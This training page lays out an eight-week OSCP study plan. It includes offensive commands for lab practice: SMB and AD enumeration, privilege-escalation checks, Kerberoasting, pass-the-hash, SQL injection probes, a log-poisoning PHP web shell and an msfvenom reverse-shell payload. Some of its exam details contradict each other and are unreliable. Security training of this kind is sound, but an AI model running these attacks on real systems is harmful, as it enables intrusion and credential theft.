---
layout: training-page
title: "OSCP Preparation Path (8 Weeks) — Red Team Academy"
module: "Learning Paths"
tags:
  - oscp
  - learning-path
  - certification
  - privilege-escalation
  - active-directory
  - exploit-dev
page_key: "learning-paths-oscp-prep"
render_with_liquid: false
---

# OSCP Preparation Path — 8 Weeks

The Offensive Security Certified Professional (OSCP) certification is the industry standard entry point for offensive security. This path prepares you for the PWK course and the 24-hour exam. It assumes you are comfortable at the Linux command line but have no prior pentesting experience.

---

## OSCP Exam Overview

| Parameter | Detail |
|---|---|
| Duration | 24 hours active + 24 hours report |
| Machines | 3 standalone + 1 AD set (DC + 2 machines) |
| Scoring | 60 pts standalone + 40 pts AD set = 100 pts max |
| Pass threshold | 70 points |
| Allowed tools | Any (with minor restrictions on Metasploit — one machine only) |
| Report format | Professional PDF, submitted within 24 hours of exam end |

The exam tests four core competencies:
1. **Enumeration** — identifying attack surface, open services, version fingerprinting
2. **Exploitation** — finding and using public exploits, adapting them when they fail
3. **Privilege Escalation** — escalating from low-privileged shell to SYSTEM/root
4. **Reporting** — documenting findings with evidence, severity, and remediation

The AD set is the highest-value portion (40 points). Completing it alone with the bonus points from labs gets you to 70. Many candidates fail by ignoring the AD section.

---

## Prerequisites Checklist

Before starting week 1, verify you can:
- [ ] Navigate the Linux filesystem, use pipes, redirect output
- [ ] Write a 20-line Python script (even basic loops and string formatting)
- [ ] Understand TCP vs UDP, what a port is, basic DNS, HTTP request/response
- [ ] Install and run a tool from a GitHub repo
- [ ] Set up and manage VMs with VMware or VirtualBox

If any box above is unchecked, spend one week on OverTheWire Bandit (levels 0–25) and a basic networking course before beginning.

---

## Week 1: Fundamentals and Reconnaissance

**Goal:** Build the mental model for a structured pentest and get comfortable with recon tooling.

### Required RTA Pages

| Page | Focus |
|---|---|
| [/fundamentals/methodology](/fundamentals/methodology) | Pentesting phases, the PTES framework, structured thinking |
| [/fundamentals/engagement-planning](/fundamentals/engagement-planning) | Scope definition, rules of engagement, test planning |
| [/recon/active-recon](/recon/active-recon) | Nmap, Masscan, service enumeration, scanning strategy |
| [/recon/network-enum](/recon/network-enum) | SMB enum, RPC, SNMP, LDAP, NetBIOS |

### Lab Work

Run a full Nmap scan against your lab VM:
```bash
nmap -sC -sV -p- --min-rate 5000 -oA full_scan <target_ip>
nmap -sU --top-ports 100 -oA udp_scan <target_ip>
```

Practice enumerating every service you find. If port 445 is open, run:
```bash
enum4linux-ng -A <target_ip>
smbclient -L \\<target_ip> -N
smbmap -H <target_ip>
```

### Key Concepts

- **Attack surface** — everything reachable from your network position
- **Service fingerprinting** — version numbers are crucial for exploit matching
- **Scanning strategy** — always do a fast full-port scan first, then deep-dive on open ports
- **searchsploit workflow** — `searchsploit <service> <version>`, copy with `-m`, review before running

### Practice Machines (HTB / VulnHub)

- HTB Lame (beginner, Samba CVE, good enumeration practice)
- HTB Legacy (SMB, straightforward initial foothold)
- VulnHub Kioptrix Level 1 (classic first machine)

---

## Week 2: Exploitation Fundamentals

**Goal:** Go from identified vulnerability to working shell reliably, across multiple service types.

### Required RTA Pages

| Page | Focus |
|---|---|
| [/exploitation/service-exploits](/exploitation/service-exploits) | Public exploit usage, ExploitDB, searchsploit, exploit adaptation |
| [/exploitation/password-attacks](/exploitation/password-attacks) | Hydra, Medusa, CrackMapExec, credential spraying, default creds |
| [/exploitation/reverse-shells](/exploitation/reverse-shells) | Shell types, upgrade to PTY, catch and stabilize sessions |
| [/exploit-dev/stack-overflow](/exploit-dev/stack-overflow) | Introduction to BOF — needed for BOF machine on exam |

### Shell Stabilization Workflow

Once you catch a reverse shell, stabilize immediately:
```bash
# On target (Python method)
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Then Ctrl+Z to background
stty raw -echo; fg
export TERM=xterm

# Or use script
script /dev/null -c bash
```

### Exploit Adaptation

Most public exploits need minor modification. Common changes:
- Swap LHOST / LPORT variables
- Adjust shellcode if the exploit contains payload inline
- Fix Python 2 vs Python 3 syntax issues (print statements, urllib)
- Handle SSL/TLS when the service uses HTTPS

### Password Attack Priority

1. Try default credentials first (admin:admin, admin:password, service-specific defaults)
2. Check for empty passwords
3. Try credential stuffing if you found any credentials elsewhere
4. Brute-force only as a last resort — it's slow and noisy

### Practice Machines

- HTB Jerry (Tomcat default creds, WAR file deployment)
- HTB FTP (anonymous FTP access leading to foothold)
- HTB Netmon (PRTG default creds, RCE via sensor)
- VulnHub Stapler (multi-service, enumeration heavy)

---

## Week 3: Windows Privilege Escalation

**Goal:** Go from low-privileged Windows shell to SYSTEM through at least 5 different techniques.

### Required RTA Pages

| Page | Focus |
|---|---|
| [/post-exploitation/privesc-windows](/post-exploitation/privesc-windows) | Full Windows PrivEsc methodology, WinPEAS, manual checks |
| [/post-exploitation/token-impersonation](/post-exploitation/token-impersonation) | SeImpersonatePrivilege, Potato attacks, PrintSpoofer |
| [/post-exploitation/credential-manager](/post-exploitation/credential-manager) | Windows Credential Manager, DPAPI, stored creds dumping |

### Windows PrivEsc Checklist

Run through this order every time:

1. **Whoami and privileges**
   ```cmd
   whoami /all
   whoami /priv
   ```
2. **System info** — OS version, hotfixes
   ```cmd
   systeminfo
   wmic qfe get Caption,Description,HotFixID,InstalledOn
   ```
3. **Services** — unquoted service paths, weak permissions
   ```cmd
   wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
   sc qc <service_name>
   icacls "C:\path\to\service.exe"
   ```
4. **Scheduled tasks**
   ```cmd
   schtasks /query /fo LIST /v | findstr "Task\|Run As\|Next Run"
   ```
5. **AlwaysInstallElevated**
   ```cmd
   reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
   reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
   ```
6. **Stored credentials**
   ```cmd
   cmdkey /list
   dir C:\Users\ /s /b *password* *cred* *.config* 2>nul
   ```

### Token Impersonation Quick Reference

| Privilege | Tool | Notes |
|---|---|---|
| SeImpersonatePrivilege | PrintSpoofer | Works on Server 2016/2019, Win 10 |
| SeImpersonatePrivilege | GodPotato | Works on most modern Windows |
| SeAssignPrimaryTokenPrivilege | JuicyPotato | Server 2008/2012 only; needs specific CLSID |
| SeBackupPrivilege | Backup operator exploit | Can read SAM/SYSTEM hive |
| SeDebugPrivilege | Mimikatz | Can dump LSASS |

### Practice Machines

- HTB Devel (Windows, kernel exploit or token impersonation)
- HTB Bastard (Drupal RCE → Windows PrivEsc)
- HTB Grandpa/Granny (IIS WebDAV, Churrasco for older Windows)
- HTB Fuse (SeImpersonatePrivilege, PrintSpoofer)

---

## Week 4: Linux Privilege Escalation

**Goal:** Escalate from low-privileged Linux shell to root through at least 6 different techniques.

### Required RTA Pages

| Page | Focus |
|---|---|
| [/post-exploitation/privesc-linux](/post-exploitation/privesc-linux) | Full Linux PrivEsc methodology, LinPEAS, GTFOBins |
| [/post-exploitation/linux-post-exploitation](/post-exploitation/linux-post-exploitation) | Post-root data collection, persistence, lateral movement |

### Linux PrivEsc Checklist

```bash
# 1. SUID binaries
find / -perm -u=s -type f 2>/dev/null

# 2. Sudo permissions
sudo -l

# 3. Writable cron jobs
cat /etc/crontab
ls -la /etc/cron.*
find / -writable -path /proc -prune -o -path /sys -prune -o -type f -print 2>/dev/null | grep cron

# 4. World-writable files and directories
find / -writable -not -path "/proc/*" -not -path "/sys/*" -type f 2>/dev/null

# 5. NFS shares with no_root_squash
cat /etc/exports
showmount -e localhost

# 6. Capabilities
getcap -r / 2>/dev/null

# 7. Internal services (check for local-only ports)
ss -tlnp
netstat -tlnp

# 8. Kernel version for exploits
uname -r
searchsploit linux kernel $(uname -r | cut -d. -f1-2)
```

### GTFOBins Workflow

When `sudo -l` shows a binary you can run as root:
1. Go to [gtfobins.github.io](https://gtfobins.github.io)
2. Search for the binary
3. Check "Sudo" section for the exact command

Common OSCP-relevant GTFOBins: `vim`, `find`, `python`, `perl`, `nmap` (older versions), `tar`, `bash`, `env`, `less`

### Practice Machines

- HTB Beep (multiple PrivEsc paths, good practice for enumeration)
- HTB Bashed (web shell → enumeration → sudo abuse)
- HTB Shocker (ShellShock → sudo bash PrivEsc)
- HTB Valentine (Heartbleed → SSH key recovery → sudo)
- VulnHub Kioptrix series (classic Linux PrivEsc progression)

---

## Week 5: Active Directory Basics

**Goal:** Understand the AD exam set structure, complete basic enumeration, and execute the most common AD attacks.

### Required RTA Pages

| Page | Focus |
|---|---|
| [/active-directory/ad-enumeration](/active-directory/ad-enumeration) | BloodHound, PowerView, net commands, ldapdomaindump |
| [/active-directory/kerberoasting](/active-directory/kerberoasting) | Identifying and cracking service account tickets |
| [/active-directory/pass-the-hash](/active-directory/pass-the-hash) | PtH with CrackMapExec, Impacket, WMIexec |

### AD Exam Set Structure

The OSCP AD set consists of:
- One domain controller (DC01)
- Two domain-joined workstations (WS01, WS02)

The attack chain typically flows:
```
External foothold (WS01 or WS02) → Credential harvesting → Lateral movement to second workstation → DC compromise
```

### Initial AD Enumeration Commands

Once you have a shell on a domain-joined machine:
```powershell
# Basic domain info
net user /domain
net group /domain
net group "Domain Admins" /domain

# PowerView (if PowerShell available)
Get-NetDomain
Get-NetUser | select samaccountname, description, passwordlastset
Get-NetGroup -GroupName "Domain Admins"
Get-NetComputer | select dnshostname, operatingsystem
```

### Kerberoasting Quick Reference

```bash
# From Linux with valid credentials
impacket-GetUserSPNs -request -dc-ip <DC_IP> <DOMAIN>/<USER>:<PASS>

# Crack the ticket
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
```

Prioritize accounts with:
- Non-machine SPN (e.g., `MSSQLSvc`, `HTTP/`, `FTP/`)
- Password last set > 1 year ago
- Account is a service account (often has elevated privileges)

### Pass-the-Hash Workflow

```bash
# Verify hash works
crackmapexec smb <target_ip> -u <user> -H <nt_hash>

# Get shell
impacket-psexec <DOMAIN>/<user>@<target_ip> -hashes :<nt_hash>
impacket-wmiexec <DOMAIN>/<user>@<target_ip> -hashes :<nt_hash>
```

### Practice Machines

- HTB Active (Kerberoasting, classic AD intro)
- HTB Forest (AS-REP Roasting, DCSync path)
- HTB Sauna (AS-REP roasting, Impacket workflow)

---

## Week 6: Web Application Attacks

**Goal:** Identify and exploit the most common web vulnerabilities that appear on OSCP exam machines.

### Required RTA Pages

| Page | Focus |
|---|---|
| [/web/sql-injection](/web/sql-injection) | Manual SQLi, sqlmap, blind SQLi, file read/write via SQLi |
| [/web/file-inclusion](/web/file-inclusion) | LFI, RFI, log poisoning, PHP wrappers |
| [/web/command-injection](/web/command-injection) | OS command injection, filter bypass, blind command injection |

### Web Enumeration Priority

Before hunting for specific vulnerabilities:
```bash
# Directory and file enumeration
gobuster dir -u http://<target>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,bak
feroxbuster -u http://<target>/ -w /opt/wordlists/raft-medium-directories.txt

# Technology fingerprinting
whatweb http://<target>/
curl -s http://<target>/ | grep -i "<meta\|generator\|framework"

# Parameter fuzzing (once you find a page)
ffuf -u http://<target>/page.php?FUZZ=test -w /opt/wordlists/params.txt
```

### SQLi Quick Checks

```
# Test single quotes
'
''
`
')
'))

# Boolean blind test
' OR '1'='1
' OR '1'='2

# Error-based (MySQL)
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()))) --
```

### LFI to RCE via Log Poisoning

```bash
# Step 1: Poison Apache access log via User-Agent
curl -s http://<target>/ -A "<?php system(\$_GET['cmd']); ?>"

# Step 2: Execute via LFI
curl "http://<target>/vuln.php?file=../../../../var/log/apache2/access.log&cmd=id"
```

### Practice Machines

- HTB Poison (LFI, log poisoning, FreeBSD)
- HTB Beep (LFI + Elastix CVE)
- HTB Nibbles (Nibbleblog RCE)
- HTB Blocky (Wordpress, Java JAR credential extraction)

---

## Week 7: Buffer Overflow

**Goal:** Complete a 32-bit Windows stack overflow from scratch, reproducibly, under exam conditions.

### Required RTA Pages

| Page | Focus |
|---|---|
| [/exploit-dev/stack-overflow](/exploit-dev/stack-overflow) | Full BOF methodology, Immunity Debugger, mona.py |
| [/exploit-dev/seh-exploitation](/exploit-dev/seh-exploitation) | SEH overwrite, nseh/seh pattern, safeSEH bypass |

### BOF Exam Methodology (7 Steps)

The OSCP BOF machine follows the same structure every time. Memorize and internalize this workflow:

```
1. SPIKING         — Send large payloads to identify vulnerable function
2. FUZZING         — Find approximate crash offset (Python fuzzer loop)
3. FINDING OFFSET  — pattern_create → send → pattern_offset from EIP value
4. OVERWRITING EIP — Confirm control with 4 x "B" (42424242 in EIP)
5. FINDING BAD CHARS — Brute-force all 256 bytes to identify filtered ones
6. FINDING RETURN ADDRESS — mona.py jmp esp search in loaded modules
7. GENERATING SHELLCODE — msfvenom with bad chars excluded, NOP sled, send
```

### Essential mona.py Commands

```python
# In Immunity Debugger command bar:
!mona findmsp -distance 500      # Find offset after pattern_create
!mona bytearray -b "\x00"        # Generate bad char comparison array
!mona compare -f C:\mona\bytearray.bin -a <ESP_address>  # Find bad chars
!mona jmp -r esp -cpb "\x00\x0a\x0d"  # Find JMP ESP with excluded bad chars
```

### msfvenom Shellcode

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<your_ip> LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d" -f python

# In exploit script:
buf =  b""
buf += b"\xfc\xbb..."  # paste here

payload = b"A" * offset + b"<JMP_ESP_in_little_endian>" + b"\x90" * 16 + buf
```

### Practice VMs

- **TryHackMe Buffer Overflow Prep** (gateprep room) — best practice environment, multiple apps
- **Brainpan** (VulnHub) — Linux BOF app, good practice
- **dostackbufferoverflowgood** (GitHub repo by justinsteven) — the gold-standard BOF training app

Practice each app until you can complete the full exploit in under 25 minutes from scratch.

---

## Week 8: Full Mock Exam and Report Writing

**Goal:** Simulate the full 24-hour exam experience, then produce a professional report.

### Required RTA Pages

| Page | Focus |
|---|---|
| [/reporting/findings](/reporting/findings) | Finding documentation, evidence, severity, remediation |
| [/fundamentals/oscp-prep](/fundamentals/oscp-prep) | Exam strategy, time allocation, mental preparation |

### Mock Exam Protocol

Select 5 machines from the TJ Null list (3 standalone + 1 simulated AD set):
- Set a timer for 24 hours
- No hints, no walkthroughs
- Document every step as if writing the real report
- Take screenshots of every proof.txt

If you cannot root 3/5 machines in 24 hours, do another week of practice before booking the exam.

### TJ Null's OSCP-Like Machine Lists

**HackTheBox (recommended):**
- Easy: Lame, Legacy, Blue, Jerry, Netmon, Grandpa, Granny, Beep, Optimum
- Medium: Bastard, Bounty, Tally, Devel, Silo, Chatterbox, Bart
- AD-focused: Active, Forest, Sauna, Mantis, Cascade, Resolute

**VulnHub (offline, no subscription needed):**
- Kioptrix series (1–5), Mr. Robot, Stapler, Node, Brainpan, FristiLeaks

### Report Writing Standards

Your OSCP report must include for each machine:
1. **Executive Summary** — brief, non-technical overview
2. **Attack Narrative** — step-by-step walkthrough with commands and screenshots
3. **Findings table** — machine name, IP, vulnerability, severity
4. **Remediation recommendations** — per finding

**Evidence requirements:**
- Screenshot of `whoami` showing SYSTEM or root
- Screenshot of `type proof.txt` (Windows) or `cat proof.txt` (Linux)
- IP address visible in the screenshot (use `ipconfig` or `ip addr` in the same terminal)

See [/reporting/findings](/reporting/findings) for the full RTA report template and guidance.

### Final Exam Strategy

| Time Block | Activity |
|---|---|
| Hour 1–2 | Enumerate all 5 machines simultaneously, take notes |
| Hour 3–8 | Attack the AD set (highest value, do it while fresh) |
| Hour 9–16 | Three standalone machines, start with highest confidence |
| Hour 17–22 | BOF machine if not done, revisit stuck machines |
| Hour 23–24 | Final documentation, verify all screenshots |

**Never spend more than 2 hours stuck on a single machine.** Move on, come back. A fresh look after working on something else frequently breaks the mental block.

---

## Additional Resources

| Resource | Type | Cost |
|---|---|---|
| OffSec PWK Course | Official course lab | Paid (required for exam) |
| HackTheBox Pro Labs | AD lab environments | Paid subscription |
| TryHackMe OSCP path | Structured guided learning | Free/Paid |
| IppSec YouTube | HTB walkthroughs post-retirement | Free |
| TJ Null's OSCP list | Curated machine list | Free |
| TCM Security PEH course | Video course, OSCP-aligned | Paid (affordable) |
